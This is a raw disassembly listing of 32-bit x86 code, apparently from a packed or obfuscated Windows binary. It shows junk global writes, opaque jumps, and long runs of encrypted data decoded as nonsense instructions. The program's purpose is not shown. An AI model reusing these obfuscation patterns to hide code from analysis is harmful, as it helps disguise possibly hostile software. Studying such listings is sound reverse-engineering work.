  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433693,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x433667,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433693,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43360f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43369b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43361b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x4336d3,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0x4e85e35f
  406b85:	jmp    0x7ebea68c
  406b8a:	mov    esp,0x8c7e7e7f
  406b8f:	xor    BYTE PTR [edi+0x3e],ch
  406b92:	add    BYTE PTR [esi],dl
  406b94:	mov    es,WORD PTR [ebx+0x6c27d5c3]
  406b9a:	jl     0x406b31
  406b9c:	sub    al,BYTE PTR [ebx+0x24]
  406b9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ba0:	cli    
  406ba1:	pop    ebp
  406ba2:	leave  
  406ba3:	out    dx,al
  406ba4:	pop    edx
  406ba5:	pop    ecx
  406ba6:	jbe    0x406bae
  406ba8:	jns    0x406b53
  406baa:	and    BYTE PTR [ebx-0x7b9e9313],0xdf
  406bb1:	mov    cs,WORD PTR [ecx+0x2c]
  406bb4:	ja     0x406c24
  406bb6:	xchg   BYTE PTR [esi],al
  406bb8:	or     BYTE PTR [esi],0x7b
  406bbb:	clc    
  406bbc:	ins    DWORD PTR es:[edi],dx
  406bbd:	cwde   
  406bbe:	outs   dx,DWORD PTR ds:[esi]
  406bbf:	pop    ss
  406bc0:	std    
  406bc1:	leave  
  406bc2:	dec    esp
  406bc3:	data16 (bad) 
  406bc5:	fdivr  QWORD PTR [ebp+0x198dd607]
  406bcb:	and    eax,0xbe367966
  406bd0:	xlat   BYTE PTR ds:[ebx]
  406bd1:	push   ebx
  406bd2:	mov    ss,WORD PTR [ebx+ebx*1-0x3a]
  406bd6:	pop    esi
  406bd7:	stos   DWORD PTR es:[edi],eax
  406bd8:	cmp    eax,0xc9a9f4cf
  406bdd:	sahf   
  406bde:	jb     0x406c09
  406be0:	inc    esp
  406be1:	(bad)  
  406be2:	sub    ecx,ebp
  406be4:	mov    eax,0xf9193f90
  406be9:	test   BYTE PTR [esi],bh
  406beb:	clc    
  406bec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bed:	pushf  
  406bee:	outs   dx,DWORD PTR ds:[esi]
  406bef:	in     eax,dx
  406bf0:	pop    ss
  406bf1:	fimul  WORD PTR [edi+edx*4]
  406bf4:	sbb    edi,esp
  406bf6:	sti    
  406bf7:	outs   dx,BYTE PTR ds:[esi]
  406bf8:	mov    ebx,0xe8db3c6
  406bfd:	jns    0x406bec
  406bff:	daa    
  406c00:	dec    eax
  406c01:	shl    DWORD PTR [edx-0x32762f64],1
  406c07:	pop    ss
  406c08:	inc    esi
  406c09:	and    BYTE PTR [eax+ebp*2+0x1682f144],cl
  406c10:	loop   0x406c50
  406c12:	mov    cl,0x99
  406c14:	test   BYTE PTR [edi-0x6c6acd80],0x21
  406c1b:	dec    ebx
  406c1c:	inc    edi
  406c1d:	cmp    DWORD PTR [esi+0x4],ebx
  406c20:	push   ds
  406c21:	cdq    
  406c22:	push   edi
  406c23:	mov    ds:0x75df1355,eax
  406c28:	lea    eax,[edi-0x6fdc467c]
  406c2e:	imul   ecx,DWORD PTR [ebx-0x44],0x81385b4d
  406c35:	(bad)  
  406c36:	out    0xf9,eax
  406c38:	xchg   BYTE PTR [edx],cl
  406c3a:	imul   esp,DWORD PTR [edx],0xffffffc4
  406c3d:	pop    edi
  406c3e:	(bad)  
  406c3f:	ja     0x406c97
  406c41:	lods   eax,DWORD PTR ds:[esi]
  406c42:	shr    edx,1
  406c44:	stos   DWORD PTR es:[edi],eax
  406c45:	xchg   ebx,eax
  406c46:	and    ecx,DWORD PTR [edx+0x7c001bf7]
  406c4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c4d:	(bad)  
  406c4e:	xchg   esi,eax
  406c4f:	sub    DWORD PTR [edi-0x63ed4275],eax
  406c55:	loopne 0x406c94
  406c57:	aas    
  406c58:	dec    edx
  406c59:	pop    edi
  406c5a:	pop    ebx
  406c5b:	sbb    esi,edi
  406c5d:	cmp    BYTE PTR [edi-0xd932950],0xd9
  406c64:	in     al,0x7b
  406c66:	rcl    DWORD PTR [eax+0x7d],1
  406c69:	shr    BYTE PTR [esp+eax*8+0x69],1
  406c6d:	and    dl,bh
  406c6f:	push   es
  406c70:	pop    ebp
  406c71:	or     al,BYTE PTR [esi+eax*2]
  406c74:	dec    ecx
  406c75:	jle    0x406cb4
  406c77:	mov    ah,0x28
  406c79:	mov    bl,0xe6
  406c7b:	imul   esp,DWORD PTR [esi+0x73],0x2b
  406c7f:	mov    al,0x8a
  406c81:	out    0xda,al
  406c83:	fimul  DWORD PTR [edx-0x3ddf2caa]
  406c89:	scas   al,BYTE PTR es:[edi]
  406c8a:	jne    0x406c68
  406c8c:	jne    0x406c1a
  406c8e:	cmp    eax,0xff24e36f
  406c93:	add    DWORD PTR [esi],edi
  406c95:	dec    ebx
  406c96:	lea    edx,[ecx+0x75f2cfe8]
  406c9c:	jle    0x406cf7
  406c9e:	enter  0xc398,0xa6
  406ca2:	daa    
  406ca3:	push   0x79b2b7a2
  406ca8:	inc    esp
  406ca9:	sub    dh,BYTE PTR [ecx-0x2a]
  406cac:	pop    ss
  406cad:	and    ah,ah
  406caf:	int3   
  406cb0:	mov    bh,0x82
  406cb2:	adc    eax,0xdf1dfc2
  406cb7:	rcr    BYTE PTR [ebx+0x214f345a],cl
  406cbd:	mov    BYTE PTR [edi+0x3],cl
  406cc0:	popf   
  406cc1:	mov    esi,0xb95261e2
  406cc6:	or     ecx,DWORD PTR [edi-0x47]
  406cc9:	test   DWORD PTR [ecx],edi
  406ccb:	dec    eax
  406ccc:	test   BYTE PTR [edx+ebp*2-0x270ea93a],bh
  406cd3:	dec    edi
  406cd4:	je     0x406ca5
  406cd6:	xchg   esi,eax
  406cd7:	jmp    0xb9b22ed5
  406cdc:	xchg   ecx,eax
  406cdd:	adc    ch,BYTE PTR [ebx+0x26]
  406ce0:	push   0xe3ecaf77
  406ce5:	ins    DWORD PTR es:[edi],dx
  406ce6:	mov    esi,?
  406ce8:	imul   ebp,DWORD PTR [ebx-0x54c2d599],0xfffffff7
  406cef:	xor    al,0x9e
  406cf1:	jecxz  0x406ca3
  406cf3:	fdivr  QWORD PTR [edi-0x6f]
  406cf6:	(bad)  
  406cf7:	push   ecx
  406cf8:	data16 add al,0x8f
  406cfb:	mov    ecx,0x6cfebca9
  406d00:	(bad)  
  406d01:	ss mov edx,0xf769a85
  406d07:	test   BYTE PTR [ecx-0x4d],dh
  406d0a:	xchg   esi,eax
  406d0b:	call   0xcaff:0x9fbe97bb
  406d12:	adc    ch,BYTE PTR [ebx-0x50]
  406d15:	xchg   esp,eax
  406d16:	sbb    DWORD PTR [edi],edi
  406d18:	js     0x406d30
  406d1a:	inc    edx
  406d1b:	mov    dl,BYTE PTR [edx]
  406d1d:	(bad)  
  406d1e:	jne    0x406ce8
  406d20:	dec    esp
  406d21:	in     eax,dx
  406d22:	xor    al,0x97
  406d24:	or     BYTE PTR [eax+0x4],dl
  406d27:	fld    TBYTE PTR ds:0xddcfe4e3
  406d2d:	aam    0x33
  406d2f:	sub    cl,BYTE PTR [ecx+0x2bf64546]
  406d35:	jae    0x406d38
  406d37:	stos   DWORD PTR es:[edi],eax
  406d38:	push   esi
  406d39:	jg     0x406d09
  406d3b:	mov    eax,ds:0xac488ce3
  406d40:	popf   
  406d41:	adc    eax,0xc57ea235
  406d46:	aam    0xaa
  406d48:	iret   
  406d49:	dec    esi
  406d4a:	mov    edx,0x1ea02c9
  406d4f:	std    
  406d50:	xor    ax,cx
  406d53:	mov    ecx,0x3b02
  406d58:	sbb    DWORD PTR ds:0x43372f,0x433613
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x433723,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x433663,0x43360f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0x1b
  406d91:	jge    0x406dc6
  406d93:	scas   al,BYTE PTR es:[edi]
  406d94:	inc    eax
  406d95:	cmp    BYTE PTR [esi+0x7e],bh
  406d98:	mov    esp,0x137e7e7f
  406d9d:	or     al,0x28
  406d9f:	jnp    0x406d7f
  406da1:	dec    ebp
  406da2:	push   eax
  406da3:	push   0x10addeab
  406da8:	mov    ebp,0xd7bace8f
  406dad:	inc    esi
  406dae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406daf:	mov    ah,0x9f
  406db1:	fst    QWORD PTR [eax]
  406db3:	dec    eax
  406db4:	dec    edx
  406db5:	pop    ds
  406db6:	xor    edx,DWORD PTR [ecx]
  406db8:	les    ebx,FWORD PTR [ebx+0xa]
  406dbb:	cmp    bl,bl
  406dbd:	or     DWORD PTR [esi+ebp*1],esi
  406dc0:	sub    esp,DWORD PTR [eax]
  406dc2:	mov    ds:0x6c214805,al
  406dc7:	les    eax,FWORD PTR [edi+0x17f9a96]
  406dcd:	popf   
  406dce:	call   0xeebc:0x16d0a733
  406dd5:	outs   dx,BYTE PTR ds:[esi]
  406dd6:	jbe    0x406dca
  406dd8:	and    eax,DWORD PTR [ebx+eax*2+0x2987fb14]
  406ddf:	or     al,0x96
  406de1:	add    al,0xad
  406de3:	mov    ds:0x5c034d8b,eax
  406de8:	sbb    BYTE PTR [eax-0x69a2bfef],0xba
  406def:	(bad)  
  406df0:	test   BYTE PTR [esi-0x101486a1],dl
  406df6:	or     DWORD PTR [esi],esp
  406df8:	lods   eax,DWORD PTR ds:[esi]
  406df9:	cli    
  406dfa:	push   0xba8b13c3
  406dff:	loopne 0x406dad
  406e01:	dec    edi
  406e02:	cmp    ch,0x96
  406e05:	jle    0x406de6
  406e07:	fwait
  406e08:	add    BYTE PTR [edi+0x2895bf78],bl
  406e0e:	inc    ebp
  406e0f:	mov    eax,ds:0x6c89bd18
  406e14:	ficom  DWORD PTR [edx-0x7b]
  406e17:	dec    edi
  406e18:	popf   
  406e19:	lds    edi,FWORD PTR [ecx]
  406e1b:	out    0xa8,eax
  406e1d:	and    al,0xcf
  406e1f:	jns    0x406db1
  406e21:	popa   
  406e22:	mov    dh,ch
  406e24:	fcomp  QWORD PTR ds:0x5d16732b
  406e2a:	dec    edx
  406e2b:	dec    esp
  406e2c:	sub    edi,DWORD PTR [ebx+0x2f]
  406e2f:	out    dx,al
  406e30:	loop   0x406eaf
  406e32:	sbb    ch,dl
  406e34:	pop    edx
  406e35:	mov    edx,0x38df71d4
  406e3a:	inc    edi
  406e3b:	dec    ebp
  406e3c:	pop    esp
  406e3d:	mov    dh,0xbe
  406e3f:	sub    eax,0xb425249
  406e44:	arpl   WORD PTR ds:0x28736ace,cx
  406e4a:	and    BYTE PTR [edx+0x75],cl
  406e4d:	std    
  406e4e:	push   esp
  406e4f:	mov    bh,0xae
  406e51:	addr16 inc esp
  406e53:	jbe    0x406e3e
  406e55:	dec    ebx
  406e56:	jle    0x406eb9
  406e58:	mov    dl,0xac
  406e5a:	xchg   BYTE PTR [esi+0x3b],cl
  406e5d:	sahf   
  406e5e:	adc    al,0xab
  406e60:	int3   
  406e61:	cli    
  406e62:	ror    DWORD PTR [ecx-0x40],0x29
  406e66:	add    BYTE PTR [edi-0x2a],dh
  406e69:	add    eax,DWORD PTR [edx]
  406e6b:	pop    ecx
  406e6c:	in     al,0x1f
  406e6e:	(bad)  
  406e6f:	sti    
  406e70:	jmp    0x406e7c
  406e72:	ins    BYTE PTR es:[edi],dx
  406e73:	fsub   DWORD PTR [ebx]
  406e75:	xchg   ebx,eax
  406e76:	fwait
  406e77:	sbb    al,0xf5
  406e79:	xor    esp,esi
  406e7b:	lds    esi,FWORD PTR [edx+0x23]
  406e7e:	mov    eax,0xfb72be95
  406e83:	icebp  
  406e84:	jns    0x406e98
  406e86:	dec    ecx
  406e87:	cmp    ebp,ecx
  406e89:	adc    BYTE PTR [esi+ecx*1],bh
  406e8c:	or     al,0x9c
  406e8e:	or     DWORD PTR [ebx+0x47],edi
  406e91:	sub    ecx,DWORD PTR [ecx]
  406e93:	inc    eax
  406e94:	leave  
  406e95:	push   esp
  406e96:	push   edx
  406e97:	popf   
  406e98:	dec    ebp
  406e99:	adc    dl,BYTE PTR ds:0xba9876ab
  406e9f:	or     eax,0xdb9e6d7c
  406ea4:	bound  ebp,QWORD PTR [edx+0x14c4685f]
  406eaa:	fnsave [edi+0x16]
  406ead:	dec    esp
  406eae:	ds sahf 
  406eb0:	push   edi
  406eb1:	pop    ds
  406eb2:	lods   eax,DWORD PTR ds:[esi]
  406eb3:	sbb    al,0xcf
  406eb5:	add    cl,ch
  406eb7:	out    dx,eax
  406eb8:	cmp    edx,DWORD PTR [esi+eiz*2+0x6b]
  406ebc:	ins    DWORD PTR es:[edi],dx
  406ebd:	push   ecx
  406ebe:	pop    ebp
  406ebf:	sub    eax,0x4de3b780
  406ec4:	cwde   
  406ec5:	jns    0x406f2b
  406ec7:	pop    edx
  406ec8:	mov    ecx,0x79d81182
  406ecd:	ja     0x406eb3
  406ecf:	inc    edx
  406ed0:	xor    BYTE PTR [ebp+0x713fa79d],cl
  406ed6:	sti    
  406ed7:	repz push ds
  406ed9:	cmp    BYTE PTR [esp+edi*2-0x38],bh
  406edd:	xchg   esp,eax
  406ede:	pop    edi
  406edf:	leave  
  406ee0:	imul   esp,DWORD PTR [esi],0xffffff87
  406ee3:	and    al,0x6d
  406ee5:	imul   esp,DWORD PTR [eax+0x630fa498],0x71
  406eec:	stos   BYTE PTR es:[edi],al
  406eed:	(bad)  [ebx+esi*1+0x467240c1]
  406ef4:	jno    0x406ec2
  406ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ef7:	mov    ah,0xbb
  406ef9:	inc    esi
  406efa:	int3   
  406efb:	jp     0x406efd
  406efd:	ret    
  406efe:	xchg   edx,eax
  406eff:	ja     0x406eb9
  406f01:	pop    ebx
  406f02:	pop    esp
  406f03:	sahf   
  406f04:	test   DWORD PTR [eax-0x3f],esp
  406f07:	in     eax,0xbd
  406f09:	jecxz  0x406f0a
  406f0b:	adc    ebp,esp
  406f0d:	retf   
  406f0e:	mov    ds:0x5dafa961,eax
  406f13:	xor    edi,ebx
  406f15:	fcmovnbe st,st(4)
  406f17:	mov    al,0x82
  406f19:	ret    
  406f1a:	xor    ch,BYTE PTR [ebp-0x77]
  406f1d:	xor    al,0x8f
  406f1f:	call   0xfe3273f1
  406f24:	xor    eax,0x88800492
  406f29:	outs   dx,BYTE PTR ds:[esi]
  406f2a:	test   DWORD PTR [edi+0x1c],ebx
  406f2d:	mov    fs,WORD PTR [ecx]
  406f2f:	sahf   
  406f30:	rcr    BYTE PTR [esi+0x30],0xd1
  406f34:	xchg   BYTE PTR [ecx+0x792a4050],bh
  406f3a:	ret    
  406f3b:	jbe    0x406f03
  406f3d:	lock inc esp
  406f3f:	pop    ebx
  406f40:	fs ins BYTE PTR es:[edi],dx
  406f42:	sub    eax,0xc6951d81
  406f47:	sbb    ch,BYTE PTR [ebp+0x36]
  406f4a:	arpl   WORD PTR [edi-0x553c1279],bp
  406f50:	scas   eax,DWORD PTR es:[edi]
  406f51:	call   0x22c7eedb
  406f56:	xchg   esi,eax
  406f57:	inc    eax
  406f58:	mov    dl,0xac
  406f5a:	mov    cl,0x48
  406f5c:	hlt    
  406f5d:	popf   
  406f5e:	not    eax
  406f60:	and    DWORD PTR ds:0x43360f,0x433653
  406f6a:	and    eax,DWORD PTR [ecx]
  406f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  406f6f:	mov    DWORD PTR [ecx],eax
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0x51c12165
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0x327e7e7f
  406f9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fa0:	aaa    
  406fa1:	mov    ah,0xbf
  406fa3:	push   ebp
  406fa5:	out    0xb3,al
  406fa7:	(bad)  
  406fa8:	in     eax,0x48
  406faa:	jle    0x406fbb
  406fac:	adc    ch,0x89
  406faf:	mov    ?,WORD PTR [ecx+esi*8]
  406fb2:	repz mov esp,0x7af90029
  406fb8:	stc    
  406fb9:	test   DWORD PTR [ebx+0x45e7c18b],esp
  406fbf:	jns    0x406fe6
  406fc1:	les    esp,FWORD PTR [ebx-0x15]
  406fc4:	inc    ebx
  406fc5:	popa   
  406fc6:	xor    eax,0xc22084ab
  406fcb:	pop    ebp
  406fcc:	ficomp DWORD PTR ds:0x853a5279
  406fd2:	cli    
  406fd3:	push   cs
  406fd4:	popf   
  406fd5:	mov    ds:0xff0302a,al
  406fda:	in     eax,0xfe
  406fdc:	adc    al,0xf8
  406fde:	dec    ebx
  406fdf:	das    
  406fe0:	cmp    al,0x8b
  406fe2:	js     0x40700d
  406fe4:	dec    esi
  406fe5:	addr16 nop
  406fe7:	jmp    0x406f7b
  406fe9:	mov    ah,0xc2
  406feb:	and    al,0x96
  406fed:	mov    ds:0x531611dd,eax
  406ff2:	pop    ss
  406ff3:	mov    ah,0x9e
  406ff5:	sub    DWORD PTR [ecx+0x4fa93ecc],esp
  406ffb:	aaa    
  406ffc:	and    BYTE PTR [ebp-0xfda76b7],dl
  407002:	xchg   esp,eax
  407003:	xor    dh,BYTE PTR [ecx]
  407005:	outs   dx,BYTE PTR ds:[esi]
  407006:	mov    bh,0xb6
  407008:	aaa    
  407009:	lock sbb BYTE PTR [ecx+0x72fbc99],ah
  407010:	and    eax,0xa7ea62f6
  407015:	add    eax,0x67fb1b9c
  40701a:	sti    
  40701b:	push   cs
  40701c:	xchg   esi,eax
  40701d:	loopne 0x407054
  40701f:	add    al,0xe7
  407021:	outs   dx,BYTE PTR ds:[esi]
  407022:	test   al,0x35
  407024:	or     ecx,DWORD PTR [ebp+0x52941548]
  40702a:	and    DWORD PTR [edi+0x4c4831c0],ebp
  407030:	je     0x40700a
  407032:	into   
  407033:	leave  
  407034:	dec    edi
  407035:	mov    ebp,0x93ea259b
  40703a:	imul   ebx,DWORD PTR [edi],0xffffff99
  40703d:	mov    esi,0x3fbf600
  407042:	cmp    eax,0x1214ba31
  407047:	scas   eax,DWORD PTR es:[edi]
  407048:	pop    ecx
  407049:	fstp   TBYTE PTR [eax-0x5]
  40704c:	push   esi
  40704d:	push   edi
  40704e:	iret   
  40704f:	pop    edi
  407050:	sahf   
  407051:	xchg   esi,eax
  407052:	lods   eax,DWORD PTR ds:[esi]
  407053:	rol    bl,cl
  407055:	sbb    BYTE PTR [ebx+0x4e],ch
  407058:	cmp    DWORD PTR [ebx],ebp
  40705a:	or     BYTE PTR [edi],0xbc
  40705d:	scas   al,BYTE PTR es:[edi]
  40705e:	adc    edx,DWORD PTR [edx-0x64]
  407061:	xchg   ebp,eax
  407062:	sbb    eax,0x8412b0e
  407067:	aaa    
  407068:	dec    edx
  407069:	imul   esp,DWORD PTR [edi+0x5a00127d],0x597f8171
  407073:	mov    edi,0x8587e58a
  407078:	push   esp
  407079:	mov    edi,0x6bae5ab9
  40707e:	dec    esi
  40707f:	push   ecx
  407080:	(bad)
  407083:	add    eax,0xfaca426f
  407088:	and    al,0x21
  40708a:	pop    esp
  40708b:	xchg   ecx,eax
  40708c:	mov    dh,0x4e
  40708e:	adc    al,0xcf
  407090:	mov    edx,0x170dea11
  407095:	cmp    al,0x39
  407097:	cmp    ecx,ebx
  407099:	adc    DWORD PTR [eax],esp
  40709b:	inc    edx
  40709c:	js     0x40710d
  40709e:	retf   0x2652
  4070a1:	les    edx,FWORD PTR [ecx-0xf]
  4070a4:	adc    DWORD PTR [edi],edx
  4070a6:	bound  edx,QWORD PTR [eax+0x3a]
  4070a9:	fisubr WORD PTR [eax]
  4070ab:	sub    al,0x54
  4070ad:	add    DWORD PTR [esi-0x2ed96f1d],edi
  4070b3:	lods   al,BYTE PTR es:[esi]
  4070b5:	jno    0x4070ba
  4070b7:	push   0x75665bea
  4070bc:	nop
  4070bd:	pusha  
  4070be:	mov    dh,BYTE PTR [ecx]
  4070c0:	sub    ebp,DWORD PTR cs:[ebx+edx*2-0x2c]
  4070c5:	mov    ebp,DWORD PTR [ebp+0x23f42c12]
  4070cb:	inc    eax
  4070cc:	push   DWORD PTR [eax]
  4070ce:	bound  eax,QWORD PTR [esi+edx*1]
  4070d1:	inc    edx
  4070d2:	sti    
  4070d3:	in     eax,dx
  4070d4:	imul   ecx,ecx,0x1998a5ec
  4070da:	pop    edx
  4070db:	lahf   
  4070dc:	and    BYTE PTR [eax+0x8],0xf3
  4070e0:	ret    0xf9a5
  4070e3:	test   DWORD PTR [ebx-0x1567b5d8],ecx
  4070e9:	mov    ds:0x8f48af3d,eax
  4070ee:	hlt    
  4070ef:	aaa    
  4070f0:	out    0x18,eax
  4070f2:	inc    ebx
  4070f3:	mov    dl,0x98
  4070f5:	jno    0x40710d
  4070f7:	inc    edi
  4070f8:	cld    
  4070f9:	xlat   BYTE PTR ds:[ebx]
  4070fa:	ja     0x4070d1
  4070fc:	mov    DWORD PTR [ebx+0x13],0xdfacdf96
  407103:	xlat   BYTE PTR ds:[ebx]
  407104:	fcom   DWORD PTR [edx+0x5e]
  407107:	push   ecx
  407108:	push   0xf185f761
  40710d:	pmuludq mm1,mm6
  407110:	xor    eax,0x1a5a5d4c
  407115:	or     al,0x4e
  407117:	scas   al,BYTE PTR es:[edi]
  407118:	inc    ebx
  407119:	fisttp WORD PTR [edi+0x5ecf0719]
  40711f:	inc    esi
  407120:	je     0x407189
  407122:	clc    
  407123:	mov    cl,0x59
  407125:	and    eax,0xeaba5a49
  40712a:	std    
  40712b:	dec    esi
  40712c:	cmp    eax,0xe52308aa
  407131:	push   eax
  407132:	and    eax,0x3ab6d00f
  407137:	cmp    ah,BYTE PTR [ebx]
  407139:	idiv   DWORD PTR [eax-0x42]
  40713c:	test   eax,0x55ad1ab2
  407141:	shl    ebx,1
  407143:	out    0x5b,eax
  407145:	mov    ecx,0xd75844be
  40714a:	sub    al,0xfc
  40714c:	push   ss
  40714d:	sti    
  40714e:	fiadd  DWORD PTR [ebx]
  407150:	(bad)  
  407151:	arpl   WORD PTR [ebp+ecx*1+0x3c67e668],cx
  407158:	and    edi,DWORD PTR [esi]
  40715a:	push   edi
  40715b:	inc    ebp
  40715c:	std    
  40715d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40715e:	pop    edx
  40715f:	inc    esp
  407160:	push   DWORD PTR [ebp+0x8]
  407163:	call   0x407353
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	xchg   ebx,eax
  40717c:	dec    edi
  40717d:	xor    DWORD PTR [edx],ebx
  40717f:	int3   
  407180:	les    edi,FWORD PTR [esi+0x7e]
  407183:	mov    esp,0x177e7e7f
  407188:	cli    
  407189:	push   ebp
  40718a:	lods   eax,DWORD PTR ds:[esi]
  40718b:	sub    DWORD PTR [ecx-0x5de75de7],ebp
  407191:	ror    ah,0x84
  407194:	fidivr WORD PTR [edi]
  407196:	imul   ebx,DWORD PTR [ebx+0x78],0x963c1a77
  40719d:	adc    dh,BYTE PTR [ecx-0x230497f]
  4071a3:	mov    DWORD PTR [eax-0x67],ebp
  4071a6:	pop    ss
  4071a7:	dec    ebx
  4071a8:	leave  
  4071a9:	and    dh,BYTE PTR [ebx-0x58c71ce0]
  4071af:	icebp  
  4071b0:	jo     0x407137
  4071b2:	cmp    al,0xf5
  4071b4:	jbe    0x4071c2
  4071b6:	imul   edi,DWORD PTR [esi+0x41],0xffffffa9
  4071ba:	stos   DWORD PTR es:[edi],eax
  4071bb:	push   esp
  4071bc:	push   esi
  4071bd:	inc    edx
  4071be:	stc    
  4071bf:	adc    bh,BYTE PTR [ecx+0x70e6d8a5]
  4071c5:	or     ah,dh
  4071c7:	mov    dh,0x82
  4071c9:	xor    al,0x3e
  4071cb:	or     ch,bl
  4071cd:	pushf  
  4071ce:	mov    dh,0x8d
  4071d0:	mov    bh,0x11
  4071d2:	mov    ch,0x36
  4071d4:	cmp    eax,0x40a07777
  4071d9:	inc    eax
  4071da:	and    al,0xf3
  4071dc:	(bad)  
  4071dd:	mov    bh,dl
  4071df:	pushf  
  4071e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071e1:	adc    ah,BYTE PTR [edi]
  4071e3:	in     al,dx
  4071e4:	pop    esp
  4071e5:	sbb    al,0x7b
  4071e7:	fisub  DWORD PTR [eax+ebx*2+0x30]
  4071eb:	and    eax,0x87a9c198
  4071f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071f1:	pop    eax
  4071f2:	mov    edi,0xd672742
  4071f7:	sahf   
  4071f8:	xor    al,0xdb
  4071fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071fb:	or     al,0x49
  4071fd:	fdivr  DWORD PTR [esi-0x7]
  407200:	bound  ecx,QWORD PTR [eax+0x6b]
  407203:	scas   al,BYTE PTR es:[edi]
  407204:	adc    BYTE PTR cs:[ebx-0x30ae8ebe],dh
  40720b:	out    0x50,eax
  40720d:	jne    0x40722b
  40720f:	sbb    dl,bh
  407211:	xor    cl,al
  407213:	sub    cl,BYTE PTR [ebx+0x69c3e7d7]
  407219:	dec    eax
  40721a:	lods   eax,DWORD PTR ds:[esi]
  40721b:	out    0x33,al
  40721d:	push   ds
  40721e:	test   BYTE PTR [edi],ch
  407220:	cli    
  407221:	push   ss
  407222:	jmp    0xd1b1:0x1442e701
  407229:	out    dx,eax
  40722a:	mov    ds:0x272f63f4,al
  40722f:	(bad)  
  407230:	mov    dh,0xf7
  407232:	lahf   
  407233:	scas   eax,DWORD PTR es:[edi]
  407234:	mov    BYTE PTR [ebx+edx*2-0xb],ch
  407238:	mov    ds:0x87b6f5d2,eax
  40723d:	stos   DWORD PTR es:[edi],eax
  40723e:	das    
  40723f:	xchg   esp,eax
  407240:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407241:	mov    BYTE PTR [ecx-0x60],ch
  407244:	lahf   
  407245:	mov    ebp,0x8c387961
  40724a:	popa   
  40724b:	or     eax,DWORD PTR [ebp-0x5a]
  40724e:	out    0x5a,al
  407250:	push   ebx
  407251:	cmp    ecx,DWORD PTR [eax+0x2]
  407254:	mov    eax,ds:0x5cb8e560
  407259:	dec    edx
  40725a:	push   ebp
  40725b:	jnp    0x40728b
  40725d:	xor    DWORD PTR [ebp-0x69],ecx
  407260:	inc    esi
